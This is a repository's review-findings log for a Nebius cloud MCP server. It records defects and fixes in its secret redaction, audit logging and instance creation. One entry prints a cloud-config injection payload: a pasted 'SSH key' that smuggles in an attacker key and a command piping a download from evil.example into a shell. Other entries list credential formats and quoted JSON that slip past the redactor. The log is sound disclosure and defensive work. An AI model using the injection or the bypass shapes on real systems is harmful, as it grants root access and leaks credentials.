# Review findings

A running log of defects found while reviewing completeness and functionality,
with the state of each. **Open** entries are in the order they were found;
**Fixed** entries are newest first. Every entry names how it was found, so the
same technique can be reapplied.

This file is for *findings*. Forward-looking work lives in
[ROADMAP.md](ROADMAP.md) and [plans/](plans/).

## Open

### R-004 — `nebius-mcp` is not published to PyPI

**Severity:** high. Every install path in the README fails.

`https://pypi.org/pypi/nebius-mcp/json` returns 404. The README documents
`uv tool install nebius-mcp`, `uvx nebius-mcp`, and
`claude mcp add nebius -- uvx nebius-mcp`. All three fail for anyone who has
not cloned the repo.

Two paths do work today and were verified end to end:

```bash
uvx --from git+https://github.com/opencolin/nebius-mcp nebius-mcp
```

```bash
uv run --directory /path/to/nebius-mcp nebius-mcp
```

**Status:** the README now documents the git-based invocation, which is
verified working. `.github/workflows/release.yml` builds, checks metadata,
smoke-tests the built wheel, and publishes on a `v*` tag via PyPI Trusted
Publishing.

**Remaining, and only the repo owner can do it:** register the trusted
publisher at https://pypi.org/manage/account/publishing/ with project
`nebius-mcp`, owner `opencolin`, repository `nebius-mcp`, workflow
`release.yml`, environment `pypi`. Then tag a release. Until that is done the
git URL stays the only install path.

**Found by:** querying the PyPI JSON API for the name the README tells people
to install.

### R-007 — Two validators are written but never called

**Severity:** low, but the README asserted them as features.

`validation.py` defines `validate_id` and `validate_static_ip_cidr`. Neither
is referenced by any tool — only by their own unit tests. The README claimed
`/32` suffix and resource-ID format checking among the guard rails; that
claim has been corrected to describe only what is enforced
(`validate_disk_type`, `validate_boot_disk_size`).

Wiring `validate_id` broadly is not obviously safe: the patterns in
`_ID_PATTERNS` are inferred rather than documented, so a stricter-than-reality
pattern would reject valid IDs and break working setups. Decide deliberately —
either confirm the formats against the API and wire them in, or delete them.

**Found by:** grepping for references to every public helper, rather than
assuming exported functions are used.

### R-008 — Generic list returned nothing for three resource types

**Severity:** high. Silently wrong results.

`nebius_resource_list` read the response's `items` field. Three services name
that collection after the resource instead:

| Resource | Field |
|---|---|
| `msp.postgresql_cluster` | `clusters` |
| `msp.postgresql_backup` | `backups` |
| `common.operation` | `operations` |

Listing any of those returned `{"items": []}` — indistinguishable from an
account that genuinely has none. A wrong answer that looks like a correct one
is worse than an error, because nothing prompts anyone to check.

**Fix:** `catalog.list_items_field` resolves the collection field from the
response message, preferring `items` and otherwise taking the sole non-token
field. A test asserts every list-capable resource resolves one, so a new
service with a different name fails the suite instead of silently returning
nothing.

**Found by:** the roadmap council's critique pass, which resolved all list
response messages and compared their fields against what the code assumed.
None of the existing tests could catch it — they mock the response object, so
`items` exists because the mock was told to have it.

### R-009 — Truncated PEM blocks leaked their key material

**Severity:** high.

The PEM redaction pattern made the END marker an optional trailing group, so
a block without one matched only its header and everything after it survived:

    "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA..."
    -> "<redacted>\nMIIEowIBAAKCAQEA..."

The code comment claimed the opposite — that the optional marker was there so
truncated blocks would still match. Truncation is not hypothetical: capped
error strings and log tails are exactly where half a PEM appears, and the
error path was routed through the sanitizer in the same release.

**Fix:** consume to the END marker or to end-of-string.

**Found by:** the fan-out's adversarial verification pass, using mutation
testing — it also showed that removing `client_certificate_data`,
`ssh_authorized_keys`, the hyphen separator, or the `X-Amz-Credential`
alternative each left the whole suite green. Tests now assert each
individually.

**The lesson:** a passing suite says nothing about which rules it actually
constrains. Mutating the code and re-running is what tells you.

### R-011 — The audit log cannot tell a previewed delete from an executed one

**Severity:** medium. The log answers "a delete tool was called", not "the
delete happened".

`audit.make_middleware` records `outcome: "ok"` for any call that returns
without raising. Both halves of the confirm two-step do exactly that: the
first returns the dry-run envelope from `confirm.preview_or_execute` having
changed nothing, the second returns the operation summary having destroyed the
resource. `tool`, `mode` and `outcome` are identical across the pair.

`SECURITY.md` already concedes that the log stores an argument *hash* rather
than the arguments, so it cannot tell you *what* was deleted. This is the
sharper half of the same problem, and until this finding it was conceded
nowhere: the log cannot tell you *whether* anything was.

One mitigating detail, worth stating because the opposite is the natural
assumption: the two records are not byte-identical. `confirm_token` is one of
the tool's own arguments, so it is inside the blob `audit._hash_args` digests,
and the executing call hashes differently from the preview. That distinguishes
the pair from one call retried; it still does not say which record is which.

The fix is a field, not a redesign — an `outcome` of `previewed` alongside
`ok`. The middleware does receive the tool's return value and could sniff the
dry-run envelope by its `confirm_token` key, but keying an audit record on the
shape of a payload is how audit records start lying. The signal should come
from `preview_or_execute`, which is the only code that knows which of its two
paths it took.

**Found by:** taking one row of the `SECURITY.md` threat table — "Audit
tampering" — and asking which specific questions the log can actually answer.
"Was this instance deleted?" was not one of them.

### R-012 — Quoting a field name defeats the in-string assignment rule

**Severity:** medium. Pre-existing; not introduced or closed by the sanitizer
work in this round, which was scoped to cost and false positives.

The sanitizer has two ways to catch `name = secret`. When the payload is a
mapping, `_is_sensitive_key` (`src/nebius_mcp/sanitize.py:177`) matches the
dict key. When the secret is *inside a string* — an exception message, a query
string, a cloud-init fragment quoted into a description — `redact_text`
(`src/nebius_mcp/sanitize.py:241`) has to find the name itself, with the regex
at `src/nebius_mcp/sanitize.py:229`.

That regex requires the separator to follow the name immediately:
`[ \t]*[:=][ \t]*` at `src/nebius_mcp/sanitize.py:229`. A quote character sits
between them in every JSON document, so the candidate never forms. The result
is an asymmetry sharp enough to be worth stating outright — all four verified
against the current module:

| String | Result |
|---|---|
| `{"secret_key": "<a key id>"}` | survives verbatim |
| `secret_key: <a key id>` | `secret_key: <redacted>` |
| `{'password': 'hunter2'}` | survives verbatim |
| `password: hunter2` | `password: <redacted>` |

The surprising part is the direction. The better-formed, machine-generated
shape is the one that gets through; the loose human-written one is caught.
Anywhere an API error quotes the request body back, or a description embeds a
JSON config blob, the string arrives in the JSON form.

The mapping path is unaffected: `redact({"secret_key": "..."})` still returns
`{"secret_key": "<redacted>"}`. This is only about JSON that has already been
flattened into a `str` by the time the sanitizer sees it.

Not fixed, and the fix is not one character. Allowing an optional quote between
name and separator widens what the rule matches, and R-015 records what
happened the two times this regex was widened: both attempts shipped a
quadratic cost blowup, and the second also silently narrowed which credential
names were recognised at all. Whoever takes this on should treat mutation
testing and a cost benchmark as part of the change, not as review afterthoughts.

**Found by:** adversarial verification of the attempted rework recorded in
R-015. Every case that rework added, and every case the rule already had,
writes the assignment unquoted; nobody had asked what the same rule does to
the quoted spelling of the identical pair.

### R-013 — Credentials that no rule names at all

**Severity:** medium. Pre-existing, and unchanged by this round.

R-012 is about a credential whose field name the assignment rule cannot see.
This is the set where there is no usable field name to begin with, so the only
thing that could catch them is `_SENSITIVE_VALUE_PATTERNS`
(`src/nebius_mcp/sanitize.py:85`), which names four shapes: JWT, the `ne1…`
Nebius prefix, PEM private-key blocks, and three `X-Amz-` query parameters.
Everything below was confirmed to pass through both `redact` and `redact_text`
byte-for-byte unchanged.

**URL userinfo.** The credential sits between `//` and `@`, introduced by a
colon that belongs to the URL syntax rather than to an assignment:

    postgres://appuser:s3cr3tP4ss@db.internal:5432/prod
    redis://:hunter2@cache.internal:6379/0
    https://svc:9f2c1a4b@proxy.corp.example:3128/

These are not exotic. They are the exact shape of a DSN in a cloud-init
fragment quoted into a resource description, and of the text after "failed to
connect to" in a driver exception — which `src/nebius_mcp/errors.py:50` now
routes through the sanitizer, so it reaches the model either way.

Worth flagging for whoever fixes it: a userinfo rule has to distinguish the
colon in `user:pass@host` from the colon in `token-service.internal:8443` and
in `my-secrets-app:v1.4.2`. Widening the assignment rule to cover the first
without eating the other two is exactly the problem R-015 records two failed
attempts at. A dedicated `scheme://userinfo@host` value pattern, which can
anchor on `//` and `@`, is the cheaper route and does not touch the assignment
rule at all.

**Provider token formats.** No prefix rule exists for any third-party issuer.
Written as shapes rather than as literals, because a literal here would be a
plausible-looking credential living in a public repository forever, and
GitHub's own secret scanning rejects the push — `tests/unit/test_sanitize.py`
already splits `"AKIA" + "EXAMPLE"` for the same reason:

| Issuer | Shape |
|---|---|
| GitHub personal access token | `ghp_` then 36 alphanumerics |
| Slack bot token | `xoxb-` then three `-`-separated numeric/alphanumeric fields |
| AWS access key ID | `AKIA` then 16 uppercase alphanumerics |

These are cheap to add and have published, unambiguous shapes — the usual
argument against a prefix denylist, that it is guesswork, does not apply. Note
the second-order lesson: a denylist documented by example is a denylist that
cannot be committed.

Azure's `AccountKey=…` is in this group by outcome but not by mechanism, and
the distinction matters to anyone fixing it. It *is* a well-formed assignment,
in exactly the `name=value` shape `_ASSIGNMENT_PATTERN`
(`src/nebius_mcp/sanitize.py:229`) is built for. It survives only because none
of the keywords in that pattern — `secret`, `token`, `password`, `passwd`,
`credential`, `api_key`, `private_key`, `authorization` — appears in the name
`AccountKey`. So a whole connection string is returned intact:

    DefaultEndpointsProtocol=https;AccountName=x;AccountKey=Zm9v…;

That one is a one-word addition to the keyword list, not a new value pattern.

None of this is a regression, and none of it is claimed anywhere. `SECURITY.md`
already says the sanitizer is a denylist and that a field it does not name is
returned verbatim. This entry exists so the specific unnamed shapes are on the
record instead of being rediscovered.

**Found by:** adversarial verification of the attempted sanitizer rework
recorded in R-015 — probing the denylist with credential formats it does not
claim, on the principle that a denylist's real boundary is only visible from
outside it.

### R-015 — Two attempts to unify the sanitizer's two paths, both reverted

**Severity:** low as it stands — the tree is back at the pre-attempt behaviour
plus one narrow fix. Recorded because the next person to look at this rule will
have the same idea, and the two ways it failed are not obvious in advance.

`redact` (every successful API response, via `safe_proto`) and `redact_text`
(exception text) do not sanitize equally. `_ASSIGNMENT_PATTERN`
(`src/nebius_mcp/sanitize.py:229`) — the rule that catches `name=secret` inside
a flat string — runs only in `redact_text`. The obvious repair is to move it
into `_redact_value` so both paths share one implementation. That was attempted
twice and reverted twice.

**Attempt 1** moved the existing regex into `_redact_value` unchanged. Its name
group is `[A-Za-z0-9_.-]*(?:secret|token|…)[A-Za-z0-9_.-]*` — an unbounded
character class in front of a literal alternation, which backtracks
quadratically. Harmless while it only saw exception strings; on the success
path it saw every field of every resource, and the module docstring says
outright that nothing caps response size. Measured: a 64 KB base64url field
took 69.6 seconds. `redact` is synchronous and called from async tool handlers,
so that is a full event-loop stall. It also mangled values the model has to act
on — `https://token-service.internal:8443/healthz` lost its port, and
`cr.eu-north1.nebius.cloud/my-secrets-app:v1.4.2` lost its tag — because the
name group matches a keyword anywhere inside a hostname or image name.

**Attempt 2** rebuilt the rule as a hand-written linear scanner with the
keyword matched as a whole name segment. It fixed the reported cases and was
mutation-tested, and it was still wrong in two ways:

- The quadratic cost moved rather than disappeared. The value alternative
  `[^\s,;&)}\]]+` excludes neither `:` nor `=`, and a rejected candidate
  advanced the cursor by only the name length, so a whitespace-free token was
  rescanned once per candidate. `redact` on 128 KB of `"a:"` repeated took
  11.9 seconds — worse than what it replaced.
- Matching the keyword as a whole segment silently *narrowed* detection.
  `PGPASSWORD=`, `dbpassword=`, `authtoken=`, `apitoken=`, `rootpassword=` and
  `vaulttoken=` were all caught before and leaked after. A change made for cost
  and false positives quietly reduced what the sanitizer recognised, and no
  test noticed.

What shipped instead is the narrow fix: `X-Amz-Security-Token` added to the
presigned-URL value pattern (`src/nebius_mcp/sanitize.py:85`), which closes the
originally reported leak — an STS session token returned in the clear on the
success path while being redacted on the error path — with no blast radius.

The asymmetry itself remains open. For whoever tries a third time: the two
failures were both cost, and both were found by benchmarking rather than by
tests. Any future attempt needs a cost benchmark across string *shapes* (long
base64url runs, separator-dense strings with no terminators, hex) and an
explicit before/after diff of which credential names are still recognised.
Neither is expensive; neither was done.

**Found by:** benchmarking the landed change rather than reading it — both
attempts passed their own suites, ruff, and mypy strict, and attempt 2's suite
included a linearity test that its own blowup shape evaded.

## Fixed

### R-010 — Operation summaries reach the model unredacted

**Severity:** medium. An API-sourced string bypasses the denylist entirely,
and unlike the other two payloads in that position, nobody chose it.

Every tool that awaits a long-running operation returns `wrap(summary)`, where
`summary` is the dict `operation._summarize` builds from the `Operation` the
API returned. Nine call sites, across `tools/_ops_helpers.py` (the shared
delete and start/stop registrations), `tools/compute.py` and
`tools/generic.py` — so every delete, every lifecycle action, and
`compute_create_instance`.

`wrap` only attaches the data preamble. It does not call `redact`. Almost
everywhere else an API payload reaches the model it does so as
`wrap(safe_proto(...))`, and `safe_proto` redacts. Two exceptions are
deliberate, and both are documented in the code:

- `secrets_reveal_payload` returns `wrap(proto_to_dict(resp))`
  (`src/nebius_mcp/tools/secrets.py:234`). Plaintext is the tool.
- Every paginated list tool assembles `next_page_token` into the envelope
  *after* `safe_proto` has run — sixteen call sites at the time of writing,
  across `tools/ai.py` (1), `compute.py` (3), `generic.py` (1), `iam.py` (1),
  `k8s.py` (2), `registry.py` (2), `secrets.py` (2) and `vpc.py` (4);
  `src/nebius_mcp/tools/vpc.py:75` is the shape. It has to stay outside
  `redact`, because the cursor's own field name matches the `token` substring
  rule, and `redact`'s docstring (`src/nebius_mcp/sanitize.py:187`) says so.

The operation summary is a third value in the same position and the only one
of the three that nobody chose.

There is a guard test for exactly this class of defect —
`test_no_read_only_tool_can_return_unredacted_secrets` walks the AST of every
module in `tools/` and fails if any tool other than `secrets_reveal_payload`
bypasses redaction — and it is green. It looks for calls to `proto_to_dict`,
because that was the only known way to opt out. `_summarize` reads its fields
off the operation with `getattr` and never touches `proto_to_dict`, and it
lives in `operation.py`, outside the directory the test walks. The guard is
blind to this path twice over.

The summary's `description` field is free text chosen by the control plane,
and neither half of the sanitizer ran over it: key-name matching never saw the
key, and the value patterns never touched the string. The other two payloads
that skip both halves are a plaintext the caller asked for and an opaque
cursor; this one was arbitrary attacker-influenced text.

**Fix:** `_summarize` (`src/nebius_mcp/operation.py:34`) now returns
`redact(summary)`. That is the tightest available choke point — it is the only
place an `Operation` becomes a plain dict, and `maybe_wait` is the sole route
to it, so all nine call sites are covered without any of them having to
remember.

Deliberately *not* in `wrap`, which is the obvious-looking central fix and is
wrong: `wrap` is also where every list tool assembles `next_page_token`, whose
own field name matches the denylist's `token` substring rule. Redacting there
would replace every pagination cursor with `<redacted>` — a silent failure that
reads as the end of the results.

Redacting the whole summary rather than only `description` was checked before
being chosen, because widening redaction is how this project has broken things
twice (R-015). None of the six keys matches `_is_sensitive_key`, and no Nebius
resource or operation ID matches a value pattern, so the identifiers a caller
needs in order to poll survive. `tests/unit/test_operation.py` pins that
alongside the redaction itself, and mutation-testing confirms removing the
`redact` call fails five of those tests rather than none.

What this does **not** close is R-012: `redact` applies the value patterns and
not the in-string assignment rule, so `db_password=…` written into an operation
description still survives. A test pins that explicitly, so the limitation is
recorded rather than assumed away.

**Found by:** listing every `wrap(...)` call site under `tools/` and asking
which ones do not pass their payload through `safe_proto` first. Whether the
sanitizer runs is a property of the call sites, not of the module. Independently
reported by a second reviewer against the same commit, which is the useful
signal — it was reachable from a plain read of the code, not only from the
call-site sweep.


### R-014 — A pasted SSH key could inject arbitrary cloud-config as root

**Severity:** high.

`compute_create_instance` built its cloud-config by interpolating the caller's
`ssh_public_key` into a YAML list item:

    "    ssh_authorized_keys:\n"
    f"      - {ssh_public_key.strip()}\n"

`strip()` removes surrounding whitespace and nothing interior. A newline in the
middle of the value therefore ended that list item and continued the document
at whatever indentation followed. The argument was never validated, so passing
this as `ssh_public_key` —

    ssh-ed25519 AAAA…Alice alice@laptop
          - ssh-ed25519 AAAA…Mallory mallory@evil.example
    runcmd:
      - curl http://evil.example/x | sh

— produced valid cloud-config carrying a second authorized key and a top-level
`runcmd`. cloud-init runs it as root on first boot, and the instance is a GPU
box the user is paying for.

Two things that should have contained it did not:

- **The confirm token did not bind the key.** `ssh_public_key` was absent from
  the `args` dict hashed into the token, so the preview and the executing call
  could carry different keys and the token still verified.
- **The preview did not mention the key.** A reader vetoing the call in the
  transcript saw name, platform, preset, image, disk size, subnet and public
  IP — nothing about who was being given shell.

**Fix:** `_validate_ssh_public_key` (`src/nebius_mcp/tools/compute.py:110`) is
called at `src/nebius_mcp/tools/compute.py:632`, before the parent is resolved,
before a token is minted and before any SDK object exists. It refuses on two
grounds: any character outside printable ASCII 0x20–0x7E, and failure to parse
as exactly one OpenSSH public key line. Printable-ASCII rather than "no `\n`"
because `\n` is not the only codepoint something downstream may treat as a line
break — Python's own `str.splitlines` honours nine others — and enumerating
what the guest's YAML parser honours would be a guess. Neither refusal quotes
the value back: the likeliest wrong paste here is a private key.

The validated key is now in the token's `args`
(`src/nebius_mcp/tools/compute.py:662`) and summarized into the preview by
`_ssh_key_summary` (`src/nebius_mcp/tools/compute.py:165`) as an
`ssh-keygen`-compatible `SHA256:` fingerprint plus a length-capped key type and
comment. Fingerprint, not key, so the transcript stays readable; capped,
because both echoed fields are caller-controlled.

**Known cost, stated because it is a real narrowing:** the tool now rejects
values OpenSSH itself accepts — `authorized_keys` option prefixes
(`command="…" ssh-ed25519 …`) and any comment containing a non-ASCII
character. The value is one pasted line and the comment is droppable; the
failure mode of laxity is unauthenticated root.

**Found by:** adversarial verification of a fix, which is a technique this log
had not recorded before. The round that introduced the preview claimed it
reported "the key's fingerprint". Reading that claim against the code asked the
next question — what else can that argument hold? — and the injection was in
the answer. The defect itself long predated the claim; what surfaced it was
checking a new sentence against old code.

### R-006 — `check_environment` reported credentials that cannot authenticate

**Severity:** high.

A profile being *present* is not the same as it being *usable*. A
`federation` profile with no `federation-id`, or a service-account profile
missing its key, parses fine and then fails on the first API call. The
preflight tool reported `has_credentials: true` with a resolved `parent_id`,
which is maximally misleading precisely when someone is trying to work out
why every tool errors.

**Fix:** `resolve_credentials` now returns `profile_problem`, checking only
shapes confirmed to fail. `check_environment` surfaces it and puts it first
in `next_steps`. `has_any` accounts for it, and `get_sdk` reports the
specific problem instead of the generic "no credentials found" message that
tells you to create a profile you already have.

An explicit `NEBIUS_IAM_TOKEN` still wins over a broken profile, per
precedence rule 1 — that ordering bug appeared in the first cut of this fix
and is covered by a test now.

**Found by:** calling a live tool and comparing what happened to what
`check_environment` had just claimed.

### R-005 — Profile and `NEBIUS_PROFILE` authentication never worked

**Severity:** critical.

`get_sdk()` constructed a bare `SDK()` on the stated assumption that its
"built-in Config" would apply the documented precedence. It does not. A bare
`SDK()` falls back to `EnvBearer` and raises
`NoTokenInEnvError: No token found in the environment variable: NEBIUS_IAM_TOKEN`
unless that variable is set.

So precedence rules 2 and 3 — `NEBIUS_PROFILE` and `~/.nebius/config.yaml` —
were dead. Every tool failed for anyone who set up the documented way, with
`nebius profile create` / `nebius iam login`. Only an exported token worked.

**Fix:** build the SDK with an explicit
`config_reader=nebius.aio.cli_config.Config(...)`, which implements the whole
precedence including the env token, so one path covers all three sources.
Also passes `federation_invitation_no_browser_open=True`: this process is an
MCP server attached to a client's stdio, and must never try to open a
browser. `no_parent_id=True` because parent is resolved per tool, and
`NoParentIdError` at construction would break every tool on a profile with no
default project.

**Found by:** calling a read-only tool against the live API. No unit test
could catch this — they all mock the service layer, so `get_sdk` never runs.
**The lesson: mocking at the client boundary leaves credential resolution
completely untested.**

### R-003 — Audit log written to stdout, corrupting the JSON-RPC stream

**Severity:** critical. Fixed in #3 (`fd3eae4`).

The server speaks MCP over stdio, so stdout is the protocol channel. Every
tool call wrote its audit record there, and clients parsed each one as a
JSON-RPC message, producing a `JSONRPCError` per call.

`audit.py` called `logging.basicConfig(stream=sys.stderr)`, which appears to
handle this but does not — structlog is not routed through stdlib logging
here, and its default `PrintLoggerFactory` writes to stdout. The module
docstring, README, and CHANGELOG all already claimed stderr.

**Fix:** `logger_factory=structlog.PrintLoggerFactory(file=sys.stderr)`.
Regression test in `tests/unit/test_audit_stream.py` runs a real subprocess
and asserts stdout is empty.

**Found by:** driving the server over a real stdio transport instead of
in-process `Client(app)`. In-process clients never open a pipe, so stdout and
the protocol stream are different objects and the collision cannot occur.
**This is the lesson worth keeping: some defects only exist at the transport
boundary.**

### R-002 — `proto_to_dict` broken on `nebius>=0.4`

**Severity:** critical. Fixed in #1 (`af5a52b`).

Serialized every tool result through `google.protobuf`'s `MessageToDict`,
which raises `AttributeError: DESCRIPTOR` on the self-contained message
classes the 0.4 codegen produces. Every tool call would have failed with a
generic API error after the SDK upgrade.

**Fix:** use the SDK's native `to_json`, keeping the protobuf path as a
fallback for the 0.3 line.

**Found by:** upgrading the SDK and running the suite.

### R-001 — Unit tests read the developer's real `~/.nebius/config.yaml`

**Severity:** medium. Fixed in #1 (`af5a52b`).

The "no parent configured" branches resolved a live project ID, so two tests
failed on any machine that had used the `nebius` CLI. CI passed only because
the runner has no `~/.nebius`.

**Fix:** `tests/conftest.py` pins the config path somewhere guaranteed absent.

**Found by:** running the suite on a developer machine rather than trusting CI.

### R-000 — SDK pin excluded the entire 0.4 line

**Severity:** medium. Fixed in #1 (`af5a52b`).

`nebius>=0.3.63,<0.4` locked out KMS, application tunnels, disk snapshots,
NVLink instance groups, DNS writes, capacity allowances, and `restart` on
endpoints and jobs.

**Fix:** `nebius>=0.4.4,<0.5`. Note this is what surfaced R-002.

### C-001 — CI `security scan` job had never passed

**Severity:** medium. Fixed in #1 (`af5a52b`).

`gitleaks-action` diffs `<sha>^..<sha>`, which needs the parent commit; the
default shallow checkout has one, so git errored and the job exited 1 after
scanning ~0 bytes. Red on every run in the repo's history, having never
inspected anything.

**Fix:** `fetch-depth: 0` on the checkout.

**Found by:** reading the job log of a check that was assumed to be a known
failure.

## Review techniques that paid off

Recorded so future reviews start here rather than rediscovering them.

1. **Drive the server over a real stdio transport.** Found R-003, which no
   in-process test could ever catch.
2. **Call a tool against the live API.** Found R-005 and R-006. The unit
   suite mocks the service layer, so `get_sdk` — and therefore all credential
   resolution — never executes in tests.
3. **Check that documented install commands actually resolve.** Found R-004.
4. **Run the test suite on a machine with real credentials present.** Found
   R-001.
5. **Read the logs of CI jobs that are failing, even long-standing ones.**
   Found C-001.
6. **Verify claims in the README against the code and the network**, rather
   than assuming the author checked.
7. **Compare what a diagnostic tool reports against what actually happens.**
   Found R-006.
8. **Verify a fix adversarially, and treat its new prose as the entry point.**
   Found R-014, R-012 and R-013. A fix arrives with a claim attached — a fresh
   docstring sentence, a new preview field, a narrowed regex. Reading that
   claim against the code it describes asks the question the fix's own tests do
   not: what *else* can reach this line? R-014's injection had been there since
   the tool was written; what surfaced it was a new sentence promising the
   preview showed "the key's fingerprint", singular.
